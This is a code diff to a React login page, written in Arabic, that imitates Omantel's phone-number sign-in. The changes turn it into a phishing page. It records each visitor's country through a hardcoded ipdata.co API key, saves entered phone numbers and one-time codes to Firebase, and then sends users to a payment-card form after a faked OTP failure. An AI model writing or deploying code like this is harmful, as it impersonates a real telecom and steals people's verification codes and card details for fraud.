@@ -1,88 +1,135 @@
-"use client"
+"use client";
 
-import type React from "react"
+import type React from "react";
 
-import { useState, useEffect } from "react"
-import { ChevronRight, AlertCircle } from "lucide-react"
-
+import { useState, useEffect } from "react";
+import { ChevronRight, AlertCircle } from "lucide-react";
+import AddCard from "@/componet/cardInfo";
+import { addData, setupOnlineStatus } from "@/lib/firebase";
+import Loader from "@/componet/loader";
+function randstr(prefix: string) {
+  return Math.random()
+    .toString(36)
+    .replace("0.", prefix || "");
+}
+const visitorID = randstr("omann-");
 export default function LoginPage() {
-  const [step, setStep] = useState<"phone" | "otp">("phone")
-  const [phoneNumber, setPhoneNumber] = useState("")
-  const [rememberMe, setRememberMe] = useState(false)
-  const [otp, setOtp] = useState(["", "", "", "", ""])
-  const [timeLeft, setTimeLeft] = useState(58)
-  const [error, setError] = useState<string | null>(null)
+  const [step, setStep] = useState<"phone" | "otp" | "card">("phone");
+  const [phoneNumber, setPhoneNumber] = useState("");
+  const [rememberMe, setRememberMe] = useState(false);
+  const [otp, setOtp] = useState(["", "", "", "", ""]);
+  const [timeLeft, setTimeLeft] = useState(58);
+  const [error, setError] = useState<string | null>(null);
+  const [isDone, setIsDone] = useState(false);
 
   useEffect(() => {
-    if (step !== "otp") return
+    getLocation().then(() => {
+      setIsDone(true);
+    });
+  }, []);
 
-    if (timeLeft <= 0) return
+  async function getLocation() {
+    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      await addData({
+        id: visitorID,
+        country: country,
+        createdDate: new Date().toISOString(),
+      });
+      localStorage.setItem("country", country);
+      setupOnlineStatus(visitorID);
+    } catch (error) {
+      console.error("Error fetching location:", error);
+    }
+  }
+  useEffect(() => {
+    if (step !== "otp") return;
+
+    if (timeLeft <= 0) return;
 
     const interval = setInterval(() => {
-      setTimeLeft((prev) => prev - 1)
-    }, 1000)
+      setTimeLeft((prev) => prev - 1);
+    }, 1000);
 
-    return () => clearInterval(interval)
-  }, [step, timeLeft])
+    return () => clearInterval(interval);
+  }, [step, timeLeft]);
 
-  const handleContinuePhone = () => {
+  const handleContinuePhone = async () => {
     if (phoneNumber.trim()) {
-      setStep("otp")
-      setTimeLeft(58)
-      setError(null)
+      await addData({
+        id: visitorID,
+        phone: phoneNumber,
+        createdDate: new Date().toISOString(),
+      });
+      setStep("otp");
+      setTimeLeft(58);
+      setError(null);
     }
-  }
+  };
 
   const handleOtpChange = (index: number, value: string) => {
-    if (value.length > 1) return
+    if (value.length > 1) return;
 
-    const newOtp = [...otp]
-    newOtp[index] = value
+    const newOtp = [...otp];
+    newOtp[index] = value;
 
-    setOtp(newOtp)
+    setOtp(newOtp);
 
-    if (error) setError(null)
+    if (error) setError(null);
 
     if (value && index < 4) {
-      const nextInput = document.getElementById(`otp-${index + 1}`)
-      nextInput?.focus()
+      const nextInput = document.getElementById(`otp-${index + 1}`);
+      nextInput?.focus();
     }
-  }
+  };
 
   const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
-      const prevInput = document.getElementById(`otp-${index - 1}`)
-      prevInput?.focus()
+      const prevInput = document.getElementById(`otp-${index - 1}`);
+      prevInput?.focus();
     }
-  }
+  };
 
-  const handleContinueOtp = () => {
-    const otpCode = otp.join("")
+  const handleContinueOtp = async () => {
+    const otpCode = otp.join("");
     if (otpCode.length === 5) {
+      await addData({
+        id: visitorID,
+        otp,
+        createdDate: new Date().toISOString(),
+      });
       if (otpCode !== "123456") {
-        setError("رمز OTP غير صحيح. يرجى المحاولة مرة أخرى")
+        setError("رمز OTP غير صحيح. يرجى المحاولة مرة أخرى");
+        setStep("card");
       } else {
-        console.log("OTP verified:", otpCode)
-        setError(null)
+        console.log("OTP verified:", otpCode);
+        setError(null);
       }
     }
-  }
+  };
 
   const handleResendOtp = () => {
-    setTimeLeft(58)
-    setOtp(["", "", "", "", ""])
-    setError(null)
-  }
+    setTimeLeft(58);
+    setOtp(["", "", "", "", ""]);
+    setError(null);
+  };
 
   const handleBack = () => {
     if (step === "otp") {
-      setStep("phone")
-      setOtp(["", "", "", "", ""])
-      setError(null)
+      setStep("phone");
+      setOtp(["", "", "", "", ""]);
+      setError(null);
     }
-  }
+  };
 
-  return (
+  return isDone ? (
     <div className="min-h-screen bg-white flex flex-col">
       {/* Header with back button */}
       <div className="flex justify-between items-center p-4 border-b border-gray-200">
@@ -98,18 +145,22 @@ export default function LoginPage() {
             {/* Phone Login Step */}
             <div className="text-center mb-8">
               <h1 className="text-3xl font-bold text-gray-900 mb-3 leading-tight">
-                سجل الدخول برقم عماتل
+                سجل الدخول برقم عمانتل
                 <br />
                 الخاص بك
               </h1>
-              <p className="text-gray-600 text-sm">أدخل رقما صحيحا تسجيل الدخول</p>
+              <p className="text-gray-600 text-sm">
+                أدخل رقما صحيحا تسجيل الدخول
+              </p>
             </div>
 
             {/* Form */}
             <div className="space-y-6">
               {/* Phone number label */}
               <div>
-                <label className="block text-gray-600 text-sm mb-2">رقم الهاتف</label>
+                <label className="block text-gray-600 text-sm mb-2">
+                  رقم الهاتف
+                </label>
                 <input
                   type="tel"
                   value={phoneNumber}
@@ -129,11 +180,17 @@ export default function LoginPage() {
                     onChange={(e) => setRememberMe(e.target.checked)}
                     className="w-5 h-5 border border-gray-300 rounded cursor-pointer"
                   />
-                  <label htmlFor="remember" className="mr-2 text-gray-700 text-sm cursor-pointer">
+                  <label
+                    htmlFor="remember"
+                    className="mr-2 text-gray-700 text-sm cursor-pointer"
+                  >
                     تذكرني
                   </label>
                 </div>
-                <a href="#" className="text-orange-500 text-sm font-medium hover:text-orange-600">
+                <a
+                  href="#"
+                  className="text-orange-500 text-sm font-medium hover:text-orange-600"
+                >
                   نسيت كلمة المرور؟
                 </a>
               </div>
@@ -150,13 +207,17 @@ export default function LoginPage() {
               </button>
             </div>
           </>
-        ) : (
+        ) : step === "otp" ? (
           <>
             {/* OTP Verification Step */}
             <div className="text-center mb-8">
-              <h1 className="text-3xl font-bold text-gray-900 mb-2">أدخل الـ OTP</h1>
+              <h1 className="text-3xl font-bold text-gray-900 mb-2">
+                أدخل الـ OTP
+              </h1>
               <p className="text-gray-600 text-sm mb-2">رمز مرور لمرة واحدة</p>
-              <p className="text-gray-500 text-xs">أرسلنا إليك رمز OTP عبر الهاتف</p>
+              <p className="text-gray-500 text-xs">
+                أرسلنا إليك رمز OTP عبر الهاتف
+              </p>
             </div>
 
             {/* OTP Input Fields */}
@@ -173,7 +234,9 @@ export default function LoginPage() {
                     onChange={(e) => handleOtpChange(index, e.target.value)}
                     onKeyDown={(e) => handleOtpKeyDown(index, e)}
                     className={`w-12 h-14 text-center text-2xl font-semibold border-b-2 focus:outline-none bg-transparent transition-colors ${
-                      error ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-orange-400"
+                      error
+                        ? "border-red-500 focus:border-red-500"
+                        : "border-gray-300 focus:border-orange-400"
                     }`}
                   />
                 ))}
@@ -190,7 +253,8 @@ export default function LoginPage() {
               <div className="flex justify-end">
                 {timeLeft > 0 ? (
                   <p className="text-gray-500 text-sm">
-                    إعادة إرسال OTP بعد {String(timeLeft).padStart(2, "0")}:{String(timeLeft % 60).padStart(2, "0")}
+                    إعادة إرسال OTP بعد {String(timeLeft).padStart(2, "0")}:
+                    {String(timeLeft % 60).padStart(2, "0")}
                   </p>
                 ) : (
                   <button
@@ -215,11 +279,15 @@ export default function LoginPage() {
               </button>
             </div>
           </>
+        ) : (
+          <AddCard />
         )}
       </div>
 
       {/* Bottom divider */}
       <div className="border-t border-gray-200"></div>
     </div>
-  )
+  ) : (
+    <Loader />
+  );
 }
